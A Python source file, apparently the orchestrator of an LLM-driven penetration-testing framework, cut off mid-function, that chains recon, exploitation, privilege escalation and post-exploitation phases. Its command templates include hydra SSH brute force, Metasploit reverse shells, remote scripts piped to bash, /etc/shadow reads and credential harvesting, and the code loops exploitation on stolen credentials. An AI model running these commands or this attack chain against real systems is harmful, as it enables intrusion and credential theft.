"""
OrchestratorAgent — THE BRAIN of CyberAgent.

Controls the entire pentest mission lifecycle:
  - Builds target intelligence briefings for each specialist agent
  - Enforces phase gate conditions before advancing
  - Analyzes each agent's output and adapts the attack strategy
  - Uses DeepSeek-R1 (reasoning model) for ALL decisions
  - Never executes tools directly — delegates exclusively to specialists

Architecture rule: this is the ONLY agent that uses llm_role="reasoning".
"""
from __future__ import annotations

import importlib
import json
import os
import re
import sys
from pathlib import Path
from typing import Optional

from rich.console import Console
from rich.panel import Panel
from rich.table import Table

# ── Path bootstrap ────────────────────────────────────────────────────────────
_SRC = Path(__file__).parent.parent
if str(_SRC) not in sys.path:
    sys.path.insert(0, str(_SRC))

from agents.base_agent import BaseAgent
from memory.mission_memory import MissionMemory
try:
    from utils.phase_budget import PhaseBudget
except ImportError:
    PhaseBudget = None  # graceful degradation if module not yet deployed

console = Console()

# ── Phase → tool command examples (injected into agent briefings) ─────────────
# These are concrete CLI examples that help local models produce valid commands
# without hallucinating flags or tool names.
_PHASE_TOOL_EXAMPLES: dict[str, list[str]] = {
    "recon": [
        "nmap -sn -T4 {target}/24 -oN recon_ping.txt",
        "nmap -sV -sC -p 21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080,8443 {target} -oN recon_top.txt",
        "whois {target}",
        "dig {target} ANY +short",
        "theHarvester -d {target} -l 100 -b duckduckgo",
        "whatweb http://{target} --color=never",
    ],
    "enumeration": [
        "nmap -sV -sC -p- --open -T4 {target} -oN full_enum.txt",
        "gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -t 40 -o gobuster.txt",
        "nikto -h http://{target} -o nikto.txt",
        "enum4linux -a {target}",
        "smbclient -L //{target}/ -N",
        "snmpwalk -c public -v1 {target}",
    ],
    "vuln_scan": [
        "nuclei -u http://{target} -severity critical,high -o nuclei_out.txt",
        "nmap --script vuln {target} -oN vuln_scan.txt",
        "nikto -h http://{target} -Tuning 13 -o nikto_vuln.txt",
        "nmap --script smb-vuln-ms17-010 -p 445 {target}",
        "nmap --script http-shellshock --script-args uri=/cgi-bin/test.cgi {target} -p 80,443",
    ],
    "exploitation": [
        "msfconsole -q -x 'use {module}; set RHOSTS {target}; set LHOST {lhost}; run'",
        "python3 exploit.py {target} {port}",
        "sqlmap -u 'http://{target}/page?id=1' --batch --dbs",
        "hydra -l admin -P /usr/share/wordlists/rockyou.txt {target} ssh",
    ],
    "privesc": [
        "curl -LO https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh && bash linpeas.sh",
        "wget -O- https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash",
        "find / -perm -4000 -type f 2>/dev/null",
        "sudo -l",
        "cat /etc/crontab && ls -la /etc/cron.*",
    ],
    "postexploit": [
        "cat /etc/passwd && cat /etc/shadow",
        "find / -name '*.conf' -o -name '*.cfg' -o -name '*.env' 2>/dev/null | head -20",
        "ss -tulpn",
        "arp -a",
        "ip route",
        "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
    ],
    "reporting": [],
}

# Anti-hallucination JSON instruction appended to every _direct_llm() call.
# Prevents local models (Qwen2.5, DeepSeek-R1) from producing prose output,
# markdown fences, or trailing text that breaks json.loads().
_JSON_ONLY_INSTRUCTION = (
    "\n\nIMPORTANT: Output ONLY valid JSON after your </think> block. "
    "Do NOT include any text before or after the JSON object. "
    "Do NOT use markdown code fences (no ```json). "
    "Every string value must be quoted. "
    "Your entire response (after </think>) must be parseable by json.loads()."
)


class OrchestratorAgent(BaseAgent):
    """
    Mission commander. Uses DeepSeek-R1 (reasoning model) for every decision.
    Delegates work to specialist agents and reacts to their findings.
    """

    # Ordered attack chain — phases run in this sequence.
    #
    # NOTE: We intentionally run post-exploitation immediately after initial
    # exploitation (even before privesc) so that newly harvested credentials,
    # internal routes, and pivot targets can feed back into exploitation.
    ATTACK_CHAIN = [
        "firewall",
        "recon",
        "enumeration",
        "exploitation",
        "postexploit",
        "privesc",
        "mitigation",
        "reporting",
    ]

    # Static phase gates: (description, result_field_to_check, minimum_value)
    # Static phase gates: (description, result_field_to_check, minimum_value)
    PHASE_GATES: dict[str, tuple] = {
        "firewall":     ("detects WAF/IPS and builds evasion profile", None, None),
        "recon":        ("always runs after firewall",   None,                None),
        "enumeration":  ("recon found live hosts",       "hosts_found",       1),
        "exploitation": ("enum found exploitable OR high/critical vulns", "exploitable_vulns", 1),
        "privesc":      ("exploitation got a shell",     "shells_obtained",   1),
        "postexploit":  ("privesc got elevated access",  "root_obtained",     True),
        "mitigation":   ("always runs to provide playbooks", None,            None),
        "reporting":    ("always runs",                  None,                None),
    }

    # Map ATTACK_CHAIN phase names → MissionMemory.update_phase() values
    _PHASE_MAP = {
        "firewall":    "firewall",
        "recon":       "recon",
        "enumeration": "enum",
        "vuln_scan":   "vuln",
        "exploitation":"exploit",
        "privesc":     "privesc",
        "postexploit": "postexploit",
        "mitigation":  "mitigation",
        "reporting":   "report",
    }

    def __init__(self, mission_memory: MissionMemory):
        super().__init__(
            agent_name="OrchestratorAgent",
            mission_memory=mission_memory,
            llm_role="reasoning",   # DeepSeek-R1:8b
            max_react_iterations=5,
        )
        self.phase_results: dict[str, dict] = {}
        self.current_phase: Optional[str] = None
        # Lazy-init: MCP + external intel loaded only when first needed
        self._mcp = None
        self._external_intel = None
        # Accumulated mission intelligence — grows with each completed phase
        # and is forwarded precisely to each subsequent specialist agent.
        self.mission_intelligence: dict = {
            "phases_completed": [],
            "confirmed_hosts": [],
            "confirmed_subdomains": [],
            "confirmed_services": {},
            "confirmed_vulns": [],
            "exploitable_vulns": [],
            "critical_path": {},
            "all_attack_vectors": [],
            "security_controls": {},
            "mitre_chain": [],
            "exploitation_guidance": "",
            "shells_obtained": [],
            "credentials_found": [],
            "loot": [],
        }
        
        # COG02: Structured mission state for cognitive architecture
        self.mission_state: dict = {
            "target": "",
            "phase": "init",
            "known_hosts": [],
            "open_ports": {},  # port -> service mapping
            "service_versions": {},  # port -> version string
            "vulnerabilities": [],  # list of {cve, service, port, exploitable}
            "shells": [],  # list of {type, port, user}
            "credentials": [],  # list of {user, pass, service}
            "failed_attempts": [],  # commands that failed (avoid repetition)
            "port_scan_done": False,  # prevent repeated full port scans
            "enum_done": False,  # prevent repeated enumeration
        }

    def _update_mission_state(self, phase: str, result: dict) -> None:
        """
        COG02: Update structured mission state after each phase.
        This prevents repetition and enables intelligent phase transitions.
        """
        if phase == "recon":
            # Extract hosts and initial ports
            hosts = result.get("hosts", [])
            if hosts:
                self.mission_state["known_hosts"].extend(hosts)
            ports = result.get("open_ports", {})
            if ports:
                self.mission_state["open_ports"].update(ports)
                self.mission_state["port_scan_done"] = True
        
        elif phase == "enumeration":
            # Extract service versions and vulns
            services = result.get("service_versions", {})
            if services:
                self.mission_state["service_versions"].update(services)
            vulns = result.get("vulnerabilities", [])
            if vulns:
                self.mission_state["vulnerabilities"].extend(vulns)
            self.mission_state["enum_done"] = True
        
        elif phase == "exploitation":
            # Extract shells and credentials
            shells = result.get("shells", [])
            if shells:
                self.mission_state["shells"].extend(shells)
            creds = result.get("credentials", [])
            if creds:
                self.mission_state["credentials"].extend(creds)
        
        # Track failed attempts to avoid repetition
        if result.get("failed_commands"):
            self.mission_state["failed_attempts"].extend(result["failed_commands"])
        
        self.mission_state["phase"] = phase

    def _should_skip_port_scan(self) -> bool:
        """Check if full port scan already done."""
        return self.mission_state.get("port_scan_done", False)
    
    def _get_phase_reasoning(self, current_phase: str, next_phase: str) -> str:
        """
        COG02: Generate reasoning for phase transition.
        Used in Orchestrator prompt to explain decisions.
        """
        known = self.mission_state
        
        reasons = []
        if current_phase == "recon" and next_phase == "enumeration":
            ports_count = len(known.get("open_ports", {}))
            reasons.append(f"Found {ports_count} open ports")
            if ports_count > 0:
                reasons.append("Need to identify vulnerabilities in services")
        
        elif current_phase == "enumeration" and next_phase == "exploitation":
            vulns_count = len(known.get("vulnerabilities", []))
            reasons.append(f"Found {vulns_count} potential vulnerabilities")
            exploitable = [v for v in known.get("vulnerabilities", []) if v.get("exploitable")]
            if exploitable:
                reasons.append(f"{len(exploitable)} are exploitable")
        
        elif current_phase == "exploitation" and next_phase == "privesc":
            shells = known.get("shells", [])
            if shells:
                user = shells[0].get("user", "unknown")
                reasons.append(f"Got shell as {user}")
                if user != "root":
                    reasons.append("Need privilege escalation to root")
        
        return "; ".join(reasons) if reasons else f"Completing {current_phase}, moving to {next_phase}"

    def _get_mcp(self):
        """Lazy-load MCP PentestAI wrapper (one instance per orchestrator)."""
        if self._mcp is None:
            try:
                from mcp.pentestai_mcp import PentestAIMCP
                self._mcp = PentestAIMCP()
            except Exception as e:
                self.log_warning(f"MCP init failed: {e}")
                self._mcp = None
        return self._mcp

    def _get_external_intel(self):
        """Lazy-load ExternalIntel wrapper."""
        if self._external_intel is None:
            try:
                from utils.external_intel import ExternalIntel
                self._external_intel = ExternalIntel()
            except Exception as e:
                self.log_warning(f"ExternalIntel init failed: {e}")
                self._external_intel = None
        return self._external_intel

    def _accumulate_phase_intelligence(
        self,
        phase: str,
        phase_result: dict,
    ) -> None:
        """
        Reads what each specialist agent returned and accumulates
        it into a growing mission intelligence picture.

        This is the MEMORY of the entire mission — each phase adds
        to it and the Orchestrator uses it to brief the next agent.

        The LLM synthesizes what changed and what it means.
        Never overwrites — always accumulates.
        """
        result = phase_result.get("result", {})
        if not isinstance(result, dict):
            return

        # Mark phase complete
        self.mission_intelligence["phases_completed"].append(phase)

        # Accumulate hosts
        hosts_found = result.get("hosts", []) or result.get("hosts_found", [])
        if isinstance(hosts_found, list):
            for h in hosts_found:
                if h and h not in self.mission_intelligence["confirmed_hosts"]:
                    self.mission_intelligence["confirmed_hosts"].append(h)

        # Accumulate subdomains from recon (domain targets only)
        if phase == "recon":
            subs = result.get("subdomains", [])
            if isinstance(subs, list) and subs:
                for s in subs:
                    s = str(s).strip().lower()
                    if s and s not in self.mission_intelligence["confirmed_subdomains"]:
                        self.mission_intelligence["confirmed_subdomains"].append(s)

        # Accumulate services (from enumeration)
        if phase == "enumeration":
            services = result.get("services", {})
            if isinstance(services, dict):
                self.mission_intelligence["confirmed_services"].update(services)

            # Forward critical path directly — this is gold
            cp = result.get("critical_path", {})
            if isinstance(cp, dict) and cp:
                self.mission_intelligence["critical_path"] = cp

            # Forward all attack vectors
            av = result.get("all_attack_vectors", [])
            if isinstance(av, list) and av:
                self.mission_intelligence["all_attack_vectors"] = av

            # Forward security controls
            sc = result.get("security_controls", {})
            if isinstance(sc, dict):
                self.mission_intelligence["security_controls"] = sc

            # Forward exploitation guidance
            eg = result.get("exploitation_guidance", "")
            if eg:
                self.mission_intelligence["exploitation_guidance"] = eg

            # Accumulate confirmed exploitable vulns
            vulns = result.get("vulnerabilities", [])
            if isinstance(vulns, list):
                for v in vulns:
                    if isinstance(v, dict) and v.get("exploitable"):
                        if v not in self.mission_intelligence["exploitable_vulns"]:
                            self.mission_intelligence["exploitable_vulns"].append(v)
                self.mission_intelligence["confirmed_vulns"] = vulns

        # Accumulate MITRE chain across all phases
        mitre = result.get("mitre_attack_chain", [])
        if isinstance(mitre, list):
            for t in mitre:
                if t and t not in self.mission_intelligence["mitre_chain"]:
                    self.mission_intelligence["mitre_chain"].append(t)

        # Accumulate shells (from exploitation) — deduplicate by content
        # ExploitationAgent returns shells at the TOP-LEVEL 'shells' key (list of dicts)
        # AND may also have them inside result['shells'] — check both.
        if phase == "exploitation":
            # Top-level shells list (primary source)
            shells_top = phase_result.get("shells", [])
            # Inner result shells list (secondary source)
            shells_inner = result.get("shells", [])
            # Combine both sources for robustness
            all_shells = []
            for s in (shells_top if isinstance(shells_top, list) else []) + \
                      (shells_inner if isinstance(shells_inner, list) else []):
                if s and isinstance(s, dict) and s not in all_shells:
                    all_shells.append(s)
            
            existing = self.mission_intelligence["shells_obtained"]
            for s in all_shells:
                if s and s not in existing:
                    existing.append(s)
                    # Also ensure the shell is written to MissionMemory hosts
                    # so the phase gate (which reads memory.hosts) can see it
                    try:
                        host_ip = s.get("ip") or self.memory.target
                        self.memory.add_shell(
                            ip=host_ip,
                            shell_type=s.get("type", "shell"),
                            user=s.get("user", "unknown"),
                            port=s.get("port", 0),
                            lport=s.get("lport", 0),
                        )
                    except Exception as _e:
                        self.log_warning(f"Re-sync shell to memory failed: {_e}")
            
            if all_shells:
                self.log_info(
                    f"Intelligence: {len(all_shells)} shell(s) accumulated from exploitation"
                )

        # Accumulate credentials and loot (from post-exploit) — deduplicate
        if phase in ["exploitation", "postexploit"]:
            # Top-level credentials list
            creds_top = phase_result.get("credentials", [])
            # Inner result credentials
            creds_inner = result.get("credentials_found", [])
            all_creds = []
            for c in (creds_top if isinstance(creds_top, list) else []) + \
                      (creds_inner if isinstance(creds_inner, list) else []):
                if c and isinstance(c, dict) and c not in all_creds:
                    all_creds.append(c)
            existing_creds = self.mission_intelligence["credentials_found"]
            for c in all_creds:
                if c and c not in existing_creds:
                    existing_creds.append(c)
            loot = result.get("loot", [])
            if isinstance(loot, list):
                existing_loot = self.mission_intelligence["loot"]
                for item in loot:
                    if item and item not in existing_loot:
                        existing_loot.append(item)

        # Store accumulated intelligence in ChromaDB mission collection
        # so all agents can query it semantically
        try:
            self.chroma.store_mission_finding(
                mission_id=self.memory.mission_id,
                agent="OrchestratorAgent",
                finding=json.dumps(self.mission_intelligence, default=str),
                metadata={
                    "type": "mission_intelligence_snapshot",
                    "phase_completed": phase,
                    "exploitable_count": len(
                        self.mission_intelligence["exploitable_vulns"]
                    ),
                },
            )
        except Exception as e:
            self.log_warning(f"Mission intelligence ChromaDB store failed: {e}")

        # Log accumulated state to MissionMemory
        self.memory.log_action(
            "OrchestratorAgent",
            f"intelligence_accumulated_{phase}",
            f"exploitable={len(self.mission_intelligence['exploitable_vulns'])} "
            f"services={len(self.mission_intelligence['confirmed_services'])} "
            f"mitre={len(self.mission_intelligence['mitre_chain'])}",
        )
        self.memory.save_state()

    def _apply_placeholders(self, commands: list[str]) -> list[str]:
        """
        Substitute template placeholders in tool command examples.

        Replaces all known placeholder tokens with real or descriptive values:
          {target}  → actual mission target (IP/domain)
          {lhost}   → LHOST_IP  (operator fills this in for reverse shells)
          {module}  → EXPLOIT_MODULE
          {port}    → TARGET_PORT
        """
        target = self.memory.target
        return [
            cmd
            .replace("{target}", target)
            .replace("{lhost}", "LHOST_IP")
            .replace("{module}", "EXPLOIT_MODULE")
            .replace("{port}", "TARGET_PORT")
            for cmd in commands
        ]

    def _direct_llm(
        self,
        prompt: str,
        task_complexity: str = "medium",
        expect_json: bool = True,
    ) -> dict:
        """
        Single-shot LLM call for internal orchestrator decisions.

        Uses cyberagent-reasoning:8b (lean ~300-token Modelfile) via ollama.Client
        with adaptive token budgets tuned to task complexity.

        Anti-hallucination hardening for local models:
          - Appends strict JSON-only instruction to every expect_json call
          - Strips DeepSeek-R1 <think>...</think> chain-of-thought before parsing
          - 7-step robust JSON extractor (_extract_json_robust) handles all model quirks
          - Returns {"error": ...} on total failure — never raises

        Args:
            prompt: User prompt (no system prompt injection — Modelfile handles it).
            task_complexity: "low"|"medium"|"high" — controls num_predict budget.
            expect_json: If True, extract JSON from response and return dict.

        Returns:
            dict — always. Never raises. On parse failure returns
            {"error": "parse_failed", "raw": <first 200 chars>}.
        """
        from utils.llm_factory import get_reasoning_llm
        params = get_reasoning_llm(task_complexity)

        # Strict JSON instruction appended to every prompt — prevents the model
        # from writing prose, markdown, or incomplete objects.
        json_instruction = _JSON_ONLY_INSTRUCTION if expect_json else ""

        try:
            import ollama as _ollama
            import concurrent.futures

            def _call_llm():
                client = _ollama.Client(host="http://localhost:11434")
                return client.chat(
                    model=params["model"],
                    messages=[
                        {"role": "user", "content": prompt + json_instruction},
                    ],
                    options=params["options"],
                )
            # Avoid context-manager shutdown wait on timeout; otherwise a stuck
            # worker can block phase progression even after future timeout.
            executor = concurrent.futures.ThreadPoolExecutor(max_workers=1)
            try:
                future = executor.submit(_call_llm)
                resp = future.result(timeout=180)
            finally:
                executor.shutdown(wait=False, cancel_futures=True)
            raw = resp["message"]["content"]
        except concurrent.futures.TimeoutError:
            self.log_error("Direct LLM call timed out after 90s")
            return {"error": "llm_timeout", "raw": ""}
        except Exception as e:
            self.log_error(f"Direct LLM call failed: {e}")
            return {"error": "llm_failed", "raw": ""}

        if expect_json:
            result = self._extract_json_robust(raw)
            return result
        # Non-JSON: strip think blocks and return prose
        cleaned = re.sub(r"<think>.*?</think>", "", raw, flags=re.DOTALL)
        cleaned = re.sub(r"<think>.*$", "", cleaned, flags=re.DOTALL)
        return {"raw": cleaned.strip()}

    def _enrich_with_external_intel(self, result: dict, phase: str) -> dict:
        """
        Enrich a LLM result with external intelligence when the model's output
        lacks CVE/exploit details. Called only on parse failures or empty results.

        External intel sources (in priority order):
          1. MCP PentestAI server (if running on localhost:4090)
          2. NVD CVE API v2 (public, no key required)
          3. ExploitDB public API (no auth required)

        This is the WORST-CASE fallback — only triggered when:
          - _direct_llm() returns {"error": ...}
          - OR result has zero attack_vectors / findings

        Never blocks for more than _TIMEOUT=10s per source.
        """
        intel = self._get_external_intel()
        if intel is None:
            return result

        # Fill missing CVE details via NVD API
        cve_fields = ["cve", "cve_id", "vulnerability"]
        for field in cve_fields:
            cve_val = result.get(field, "")
            if (isinstance(cve_val, str) and cve_val.startswith("CVE-")
                    and cve_val not in ("CVE-UNKNOWN", "CVE-UNVERIFIED")):
                try:
                    nvd_data = intel.lookup_cve(cve_val)
                    if "error" not in nvd_data:
                        result.setdefault("cvss_v3", nvd_data.get("cvss_v3"))
                        result.setdefault("severity", nvd_data.get("severity"))
                        result.setdefault("cve_description", nvd_data.get("description", "")[:200])
                        result.setdefault("cve_source", "nvd_api_v2")
                except Exception:
                    pass

        # If attack_vectors is empty, search ExploitDB for relevant exploits
        if not result.get("attack_vectors") and phase in ("vuln_scan", "exploitation"):
            target = self.memory.target
            try:
                exploits = intel.search_exploits(f"{target} {phase}", limit=3)
                if exploits:
                    result["attack_vectors"] = [
                        f"{e.get('title', 'exploit')} ({e.get('cve', 'CVE-UNKNOWN')})"
                        for e in exploits[:3]
                    ]
                    result["intel_source"] = "exploitdb_api"
            except Exception:
                pass

        return result

    def _extract_json_robust(self, text: str) -> dict:
        """
        Bulletproof JSON extraction from DeepSeek-R1 output.

        Handles ALL known DeepSeek-R1 response patterns:
          Pattern 1: <think>...long chain...</think>\\n{"key": "val"}
          Pattern 2: <think>...</think>\\n```json\\n{...}\\n```
          Pattern 3: No think tags — raw JSON: {"key": "val"}
          Pattern 4: Prose + JSON: "Here is the result: {...}"
          Pattern 5: JSON with trailing text: {"key": "val"}\\nSome explanation
          Pattern 6: Nested/unclosed think: <think><think>... (model cut off mid-think)

        Never raises. Returns dict with "error" key on total failure.
        """
        if not text or not text.strip():
            self.log_warning("JSON extraction failed: empty response")
            return {"error": "parse_failed", "raw": ""}

        # STEP 1 — strip ALL <think>...</think> blocks (handles nested, greedy)
        cleaned = re.sub(r"<think>.*?</think>", "", text, flags=re.DOTALL)
        # Also strip unclosed think tags (model got cut off mid-think by token budget)
        cleaned = re.sub(r"<think>.*$", "", cleaned, flags=re.DOTALL)
        cleaned = cleaned.strip()

        # STEP 2 — extract from ```json ... ``` fences (greedy to handle nested objects)
        fence_m = re.search(r"```(?:json)?\s*(\{[\s\S]*\})\s*```", cleaned)
        if fence_m:
            try:
                return json.loads(fence_m.group(1))
            except (json.JSONDecodeError, ValueError):
                pass
        
        # Also try array extraction from fence
        fence_arr = re.search(r"```(?:json)?\s*(\[[\s\S]*\])\s*```", cleaned)
        if fence_arr:
            try:
                parsed = json.loads(fence_arr.group(1))
                if isinstance(parsed, list) and len(parsed) > 0 and isinstance(parsed[0], dict):
                    return parsed[0]  # Return first dict from array
            except (json.JSONDecodeError, ValueError):
                pass

        # STEP 3 — try direct parse on stripped text
        try:
            return json.loads(cleaned)
        except (json.JSONDecodeError, ValueError):
            pass

        # STEP 4 — find the LAST complete { } block (brace-depth tracking)
        # Model sometimes adds explanation AFTER the JSON
        brace_start = cleaned.rfind("{")
        if brace_start != -1:
            depth = 0
            for i, ch in enumerate(cleaned[brace_start:], brace_start):
                if ch == "{":
                    depth += 1
                elif ch == "}":
                    depth -= 1
                    if depth == 0:
                        candidate = cleaned[brace_start : i + 1]
                        try:
                            return json.loads(candidate)
                        except (json.JSONDecodeError, ValueError):
                            break

        # STEP 5 — find the FIRST complete { } block
        brace_start = cleaned.find("{")
        if brace_start != -1:
            depth = 0
            for i, ch in enumerate(cleaned[brace_start:], brace_start):
                if ch == "{":
                    depth += 1
                elif ch == "}":
                    depth -= 1
                    if depth == 0:
                        candidate = cleaned[brace_start : i + 1]
                        try:
                            return json.loads(candidate)
                        except (json.JSONDecodeError, ValueError):
                            break

        # STEP 6 — try on original text (before think-stripping, in case strip broke it)
        for attempt in [text, text.strip()]:
            try:
                return json.loads(attempt)
            except Exception:
                pass

        # STEP 7 — fix common JSON issues: trailing commas, single quotes, unquoted keys
        try:
            fixed = re.sub(r",\s*}", "}", cleaned)          # trailing comma in object
            fixed = re.sub(r",\s*]", "]", fixed)            # trailing comma in array
            fixed = fixed.replace("'", '"')                  # single → double quotes
            fixed = re.sub(r'(\b\w+\b)\s*:', r'"\1":', fixed)  # unquoted keys
            fixed = re.sub(r'""(\w+)"":', r'"\1":', fixed)  # fix double-double-quoted keys
            return json.loads(fixed)
        except Exception:
            pass

        # All 7 steps failed
        self.log_warning(f"JSON extraction failed from: {text[:200]!r}")
        return {"error": "parse_failed", "raw": text[:200]}

    @staticmethod
    def _load_base_model_name() -> str:
        """Read the reasoning BASE model name from config."""
        try:
            import yaml
            cfg_path = Path(__file__).parent.parent.parent / "config" / "models.yaml"
            with open(cfg_path) as f:
                cfg = yaml.safe_load(f)
            return cfg["models"]["reasoning_base"]["name"]
        except Exception:
            return "deepseek-r1:8b-llama-distill-q4_K_M"

    @staticmethod
    def _load_runtime_models() -> tuple[str, str]:
        """Read configured default/reasoning runtime model names from config."""
        try:
            import yaml
            cfg_path = Path(__file__).parent.parent.parent / "config" / "models.yaml"
            with open(cfg_path) as f:
                cfg = yaml.safe_load(f)
            default_model = cfg["models"]["default"]["name"]
            reasoning_model = cfg["models"]["reasoning"]["name"]
            return str(default_model), str(reasoning_model)
        except Exception:
            return "qwen2.5-coder:7b-instruct-q4_K_S", "qwen2.5-coder:7b-instruct-q4_K_S"

    # ── Main entry point ──────────────────────────────────────────────────────

    def run(self, target: str, phase: str = "full") -> dict:
        """
        Execute the pentest mission against *target*.

        Args:
            target: IP address or domain name.
            phase:  "full" runs the entire chain; a phase name runs just that
                    phase plus "reporting".
        Returns:
            Mission summary dict.
        """
        # ── STEP 1: Mission banner + intelligence status ──────────────────────
        mcp = self._get_mcp()
        mcp_status = mcp.status() if mcp else {"mcp_available": False}
        default_model, reasoning_model = self._load_runtime_models()
        mcp_label = (
            "[green]✓ Connected[/]" if mcp_status.get("mcp_available")
            else "[yellow]✗ Offline → ChromaDB fallback[/]"
        )
        self.console.print(Panel.fit(
            f"[bold white]🎯  Target  :[/] [cyan]{target}[/]\n"
            f"[bold white]   Mission :[/] [cyan]{self.memory.mission_id}[/]\n"
            f"[bold white]   Models  :[/] {default_model} + {reasoning_model}\n"
            f"[bold white]   RAG     :[/] 147,029 docs (15 collections) | Tools: 4,309+\n"
            f"[bold white]   MCP     :[/] {mcp_label}\n"
            f"[bold white]   Phase   :[/] [yellow]{phase}[/]",
            title="[bold red]CyberAgent PentestAI[/]",
            border_style="red",
        ))

        self.memory.log_action("Orchestrator", "mission_start", f"target={target} phase={phase}")

        # ── STEP 2: Initial planning (LLM-first) ─────────────────────────────
        planning_prompt = f"""Target: {target}
Produce initial pentest mission planning JSON.
Return JSON only:
{{
  "target_type": "ip|domain|internal",
  "initial_hypothesis": "short string",
  "recon_priorities": ["ports","services","exposed_http"],
  "estimated_complexity": "low|medium|high",
  "notes": "short operator guidance"
}}"""
        planning_result = self._direct_llm(planning_prompt, task_complexity="low")
        if not isinstance(planning_result, dict) or planning_result.get("error"):
            planning_result = {
                "target_type": "ip",
                "initial_hypothesis": "default credentials or misconfigurations",
                "recon_priorities": ["ports", "services"],
                "estimated_complexity": "medium",
                "notes": f"Planning for {target}",
            }
        self.memory.log_action("Orchestrator", "initial_planning", str(planning_result))

        # ── STEP 2.5: Firewall Detection (optional, runs before recon) ─────────
        # This step detects firewalls/IDS and sets evasion profile in MissionMemory.
        # All subsequent phases will adapt their scanning behavior accordingly.
        self._run_firewall_detection(target)

        # ══════════════════════════════════════════════════════════════════════
        # LLM FAILURE TRACKING (monitor-only; no deterministic mode switching)
        # ══════════════════════════════════════════════════════════════════════
        llm_failure_count = 0

        # ── STEP 3: Execute attack chain ──────────────────────────────────────
        phases_to_run = self._get_phases_to_run(phase)

        # Adaptive exploitation/post-exploitation loop limits
        exploit_loops_done = 0
        max_exploit_loops = int(os.getenv("CA_EXPLOIT_POSTEXPLOIT_LOOPS", "1") or 1)
        max_exploit_loops = max(0, min(max_exploit_loops, 3))

        creds_before_postexploit = 0
        for phase_name in phases_to_run:
            self.current_phase = phase_name

            self.console.print(Panel(
                f"[bold cyan]▶  PHASE: {phase_name.upper()}[/]",
                border_style="blue",
            ))
            import sys; sys.stdout.flush(); sys.stderr.flush()

            # Phase gate check
            gate_passed, gate_reason = self._check_phase_gate(phase_name)
            if not gate_passed:
                self.log_warning(f"Phase '{phase_name}' skipped — gate not met: {gate_reason}")
                self.memory.log_action("Orchestrator", f"skip_{phase_name}", gate_reason)
                continue

            # Build agent briefing
            self.console.print(f"[dim]Building agent briefing for {phase_name}...[/]")
            import sys; sys.stdout.flush()
            briefing = self._build_agent_briefing(phase_name)

            # P1-6: inject PhaseBudget into briefing so agents can self-limit
            if PhaseBudget is not None:
                phase_budget = PhaseBudget.for_phase(phase_name).start()
                briefing["phase_budget"] = phase_budget.to_dict()
            else:
                phase_budget = None
            self.console.print(f"[dim]Briefing ready for {phase_name}[/]")
            import sys; sys.stdout.flush()

            # Update mission memory phase
            mm_phase = self._PHASE_MAP.get(phase_name, phase_name)
            try:
                self.memory.update_phase(mm_phase)
            except ValueError as e:
                self.log_warning(f"update_phase({mm_phase}) skipped: {e}")

            # VERBOSE: Log phase transition with intelligence passed
            phase_idx = phases_to_run.index(phase_name)
            prev_phase = phases_to_run[phase_idx - 1] if phase_idx > 0 else "init"
            intel_summary = json.dumps(briefing, default=str)[:200] if briefing else "none"
            self._verbose_phase_transition(prev_phase, phase_name, intel_summary)

            # Instantiate and run specialist agent (with adaptive loops for exploit↔postexploit)
            agent = self._get_agent(phase_name)
            self.log_info(f"Delegating to {agent.agent_name} for phase '{phase_name}'...")
            import sys; sys.stdout.flush()

            # Snapshot pre-state for adaptive loops
            if phase_name == "postexploit":
                try:
                    creds_before_postexploit = len(self.mission_intelligence.get("credentials_found", []) or [])
                except Exception:
                    creds_before_postexploit = 0

            try:
                result = agent.run(target=target, briefing=briefing)
                self.phase_results[phase_name] = result
                
                # Track LLM failures from agent result
                if result.get("llm_failures", 0) > 0:
                    llm_failure_count += result.get("llm_failures", 0)
                    self.log_warning(f"Agent reported {result.get('llm_failures')} LLM failures (total: {llm_failure_count})")
                    
            except Exception as e:
                self.log_error(f"Agent '{phase_name}' crashed: {e}")
                result = {"success": False, "error": str(e)}
                self.phase_results[phase_name] = result
                # Count crash as LLM failure (likely timeout)
                if "timeout" in str(e).lower() or "llm" in str(e).lower():
                    llm_failure_count += 1

            # Accumulate intelligence from this phase before briefing the next
            self._accumulate_phase_intelligence(phase_name, result)

            # Post-phase analysis
            analysis = self._analyze_phase_result(phase_name, result)

            # P1-1: Critic loop — score evidence quality, surface gaps for next phase
            critic = self._critic_score(phase_name, result)
            if critic:
                analysis["critic"] = critic
                intel = self.mission_intelligence
                if "phase_critic" not in intel:
                    intel["phase_critic"] = {}
                intel["phase_critic"][phase_name] = critic
                if critic.get("confidence", 1.0) < 0.5:
                    self.log_warning(
                        f"[CRITIC] Phase '{phase_name}' low confidence "
                        f"({critic['confidence']:.2f}) — gaps: {critic.get('gaps', [])}"
                    )

            # Phase completion panel
            findings_count = analysis.get("findings_count", 0)
            recommended_next = analysis.get("recommended_next", "continue")
            key_insight = analysis.get("key_insight", "no insight")
            critic_line = (
                f"\n[dim]Critic: {critic.get('confidence', '?'):.2f} confidence | "
                f"gaps: {critic.get('gaps', [])}[/]"
                if critic else ""
            )
            self.console.print(Panel(
                f"[green]✅ Findings: {findings_count}[/]\n"
                f"[white]Next: {recommended_next}[/]\n"
                f"[white]Insight: {key_insight}[/]"
                + critic_line,
                title=f"[green]PHASE {phase_name.upper()} COMPLETE[/]",
                border_style="green",
            ))

            # Strategy update on critical finding
            if analysis.get("critical_finding"):
                self._update_attack_strategy(analysis)

            # ── Adaptive loop: exploitation → postexploit → exploitation ─────
            # Goal: once we get initial foothold, harvest creds/routes/pivots and
            # immediately feed them back into exploitation without waiting for privesc.
            if phase_name == "postexploit" and exploit_loops_done < max_exploit_loops:
                try:
                    prev_creds = int(creds_before_postexploit or 0)
                    new_creds = len(self.mission_intelligence.get("credentials_found", []) or [])
                    if new_creds > prev_creds:
                        self.log_info(
                            f"[LOOP] Post-exploit harvested new creds ({prev_creds}→{new_creds}); re-running exploitation"
                        )
                    else:
                        # Still loop once if we have any shells; pivot discovery can still help
                        if not (self.mission_intelligence.get("shells_obtained") or []):
                            continue

                    exploit_loops_done += 1
                    loop_phase = "exploitation"
                    loop_agent = self._get_agent(loop_phase)
                    loop_brief = self._build_agent_briefing(loop_phase)
                    loop_result = loop_agent.run(target=target, briefing=loop_brief)
                    # Store loop result under a distinct key but also accumulate into mission_intelligence
